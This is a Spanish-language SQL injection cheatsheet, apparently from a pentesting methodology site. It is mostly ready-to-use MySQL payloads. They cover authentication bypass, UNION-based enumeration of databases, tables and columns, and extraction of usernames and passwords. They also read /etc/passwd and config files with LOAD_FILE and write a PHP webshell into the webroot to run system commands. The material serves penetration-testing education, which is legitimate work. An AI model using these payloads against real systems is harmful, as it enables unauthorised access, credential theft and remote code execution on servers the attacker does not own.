---
title: "SQL Injection Fundamentals"
description: "UNION, error-based, blind y técnicas manuales de SQLi."
sidebar:
  order: 3
  label: "SQL Injection Fundamentals"
---
> SQLi manual en MySQL: auth bypass con OR/comments, UNION-based enumeration, lectura/escritura de archivos y webshell.

---


## Detección de SQLi

```sql
-- Payloads de detección (probar en parámetros GET/POST/Headers)
'
"
#
;
)
' OR '1'='1
' AND '1'='1
' AND '1'='2

-- URL encoded
%27  → '
%22  → "
%23  → #
```

### Señales de vulnerabilidad

```
- SQL error en la respuesta → inyección directa
- Cambio en el resultado (más/menos datos) → boolean-based
- Comportamiento diferente → ciega (blind)
- Delay → time-based (SLEEP)
```

---

## Auth Bypass

```sql
-- OR injection en username (cuando username existe)
admin' or '1'='1
-- → SELECT * FROM logins WHERE username='admin' or '1'='1' AND password='algo'

-- OR en ambos campos (sin conocer el username)
' or '1'='1
-- password field: something' or '1'='1

-- Bypass con comentario (usuario admin conocido)
admin'-- -
-- → SELECT * FROM logins WHERE username='admin'-- ' AND password='...'

-- Si hay paréntesis
admin')-- -
-- → SELECT * FROM logins WHERE (username='admin')
```

> **Tip:** `-- -` (con espacio al final) o `-- ` son equivalentes. `#` también funciona en MySQL. En URL: `--+` o `%23`.

---

## Determinar número de columnas

### Método ORDER BY (incrementar hasta error)

```sql
' order by 1-- -    → OK
' order by 2-- -    → OK
' order by 3-- -    → OK
' order by 4-- -    → ERROR  → tabla tiene 3 columnas
```

### Método UNION (añadir columnas hasta no dar error)

```sql
' UNION select 1,2,3-- -    → ERROR: different number of columns
' UNION select 1,2,3,4-- -  → OK   → 4 columnas
```

---

## Identificar columnas visibles

```sql
-- Usar números para saber cuáles se renderizan en la página
' UNION select 1,2,3,4-- -
-- Ver qué números aparecen en la respuesta → esos son los visibles

-- Confirmar con dato real en columna visible (ej. columna 2)
' UNION select 1,@@version,3,4-- -
```

---

## Fingerprinting MySQL

```sql
' UNION select 1,@@version,3,4-- -          -- versión DB
' UNION select 1,database(),3,4-- -         -- base de datos actual
' UNION select 1,user(),3,4-- -             -- usuario actual del DBMS
' UNION select 1,@@datadir,3,4-- -          -- directorio de datos
' UNION select 1,SLEEP(5),3,4-- -           -- time-based blind (retraso 5s)
' UNION select 1,POW(1,1),3,4-- -           -- si solo hay output numérico
```

---

## Enumeración — INFORMATION_SCHEMA

### Listar bases de datos

```sql
' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -

-- Ignorar: information_schema, mysql, performance_schema, sys (son de sistema)
```

### Listar tablas de una DB

```sql
' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES 
  where table_schema='dev'-- -
```

### Listar columnas de una tabla

```sql
' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA 
  from INFORMATION_SCHEMA.COLUMNS 
  where table_name='credentials'-- -
```

### Extraer datos

```sql
-- Sintaxis: db.tabla (si la DB actual es diferente a la que queremos)
' UNION select 1,username,password,4 from dev.credentials-- -

-- Concatenar dos columnas en una (si solo hay una columna visible)
' UNION select 1,concat(username,':',password),3,4 from dev.credentials-- -
```

---

## SQL cheatsheet — Queries útiles

```sql
-- Conexión MySQL local
mysql -u root -p
mysql -u root -p<password>
mysql -u root -h 10.10.10.1 -P 3306 -p

-- Ver bases de datos / tablas
SHOW DATABASES;
USE database_name;
SHOW TABLES;
DESCRIBE tabla;

-- CRUD básico
SELECT * FROM tabla;
SELECT col1, col2 FROM tabla WHERE condicion;
SELECT * FROM tabla ORDER BY col1 DESC LIMIT 10;
SELECT * FROM tabla WHERE username LIKE 'admin%';   -- % = wildcard
SELECT * FROM tabla WHERE username LIKE '___';      -- _ = exactamente 1 char
INSERT INTO tabla(col1,col2) VALUES ('val1','val2');
UPDATE tabla SET col1='nuevo' WHERE id=1;
DELETE FROM tabla WHERE id=1;
```

---

## Comentarios SQL en inyección

```sql
-- MySQL comment types
-- -           → comentario de línea (necesita espacio al final)
#             → comentario de línea (URL: %23 en browser)
/**/          → comentario inline (para bypassar filtros de espacio)

-- Ejemplos
admin'-- -      → comenta el resto de la query
' UNION select 1,2-- -
' OR 1=1#
```

---

## Lectura de archivos (requiere FILE privilege)

```sql
-- Verificar usuario actual
' UNION SELECT 1,user(),3,4-- -
' UNION SELECT 1,super_priv,3,4 FROM mysql.user WHERE user="root"-- -

-- Verificar privilegios FILE
' UNION SELECT 1,grantee,privilege_type,4 FROM information_schema.user_privileges 
  WHERE grantee="'root'@'localhost'"-- -

-- Leer archivo
' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4-- -
' UNION SELECT 1,LOAD_FILE('/var/www/html/config.php'),3,4-- -

-- Verificar secure_file_priv (vacío = podemos leer/escribir todo)
' UNION SELECT 1,variable_name,variable_value,4 
  FROM information_schema.global_variables 
  WHERE variable_name="secure_file_priv"-- -
```

---

## Escritura de archivos y webshell

```sql
-- Verificar si podemos escribir (secure_file_priv debe estar vacío)
-- Paso 1: verificar FILE privilege y secure_file_priv (ver sección anterior)

-- Paso 2: probar escritura en webroot
' UNION select 1,'test_write',3,4 INTO OUTFILE '/var/www/html/test.txt'-- -
-- Verificar: http://target/test.txt

-- Paso 3: escribir webshell PHP
' UNION select "","<?php system($_REQUEST[0]); ?>","","" 
  INTO OUTFILE '/var/www/html/shell.php'-- -

-- Paso 4: ejecutar comandos
# http://target/shell.php?0=id
# http://target/shell.php?0=whoami
# http://target/shell.php?0=cat+/etc/passwd
```

### Rutas de webroot por defecto

```
Linux  (Apache): /var/www/html/
Linux  (Nginx):  /usr/share/nginx/html/
Windows (Apache): C:/xampp/htdocs/
Windows (IIS):   C:/inetpub/wwwroot/

-- Leer config de servidor para encontrar webroot
' UNION SELECT 1,LOAD_FILE('/etc/apache2/apache2.conf'),3,4-- -
' UNION SELECT 1,LOAD_FILE('/etc/nginx/nginx.conf'),3,4-- -
```

---

## Operadores SQL — referencia

| Operador | Descripción | Símbolo equivalente |
|----------|-------------|---------------------|
| `AND` | Ambas condiciones verdaderas | `&&` |
| `OR` | Al menos una verdadera | `\|\|` |
| `NOT` | Niega la condición | `!` |
| `=` `!=` `>` `<` | Comparación | — |
| `LIKE 'val%'` | Wildcard (`%`=0+chars, `_`=1 char) | — |

---

## Pitfalls / Gotchas

- **ORDER BY número > columnas** → error que revela que superamos el límite (útil para contar).
- **UNION columnas distintas** → el nº de columnas en SELECT debe ser igual. Rellenar con números o NULL.
- **Columna no visible** → si la columna 1 no se renderiza en la página, poner el payload en la 2 o 3.
- **Comillas en comentarios** → `-- -` necesita espacio. En URLs usar `--+` o `%20`.
- **`#` en browser** → el browser lo interpreta como fragment. Usar `%23` en la URL.
- **secure_file_priv no vacío** → LOAD_FILE() y INTO OUTFILE no funcionan. MySQL moderno bloquea por defecto.
- **Permisos de escritura del OS** → aunque MySQL tenga FILE privilege, el usuario `mysql` necesita permisos de escritura en el directorio destino.
- **Error not shown** → si la app no muestra errores SQL, necesitar blind SQLi o usar sqlmap con `--technique=B`.
- **Concatenar columnas** → si solo hay 1 columna visible, usar `concat(col1,':',col2)` o `group_concat(col1)`.
- **NULL vs números** → usar NULL para rellenar columnas en UNION cuando hay incompatibilidad de tipos de datos.

---

## Cheatsheets relacionados

- [SQLMap Essentials](/metodologias/web/sqlmap-essentials/) — automatización de SQLi: detección, dump, OS shell
- [Using Web Proxies](/metodologias/web/using-web-proxies/) — interceptar y manipular peticiones SQL en Burp/ZAP
- [Shells & Payloads](/metodologias/exploitation/shells-payloads/) — webshell PHP post explotación SQLi
- [File Transfers](/metodologias/privesc/file-transfers/) — exfiltrar datos del servidor tras comprometer vía SQLi
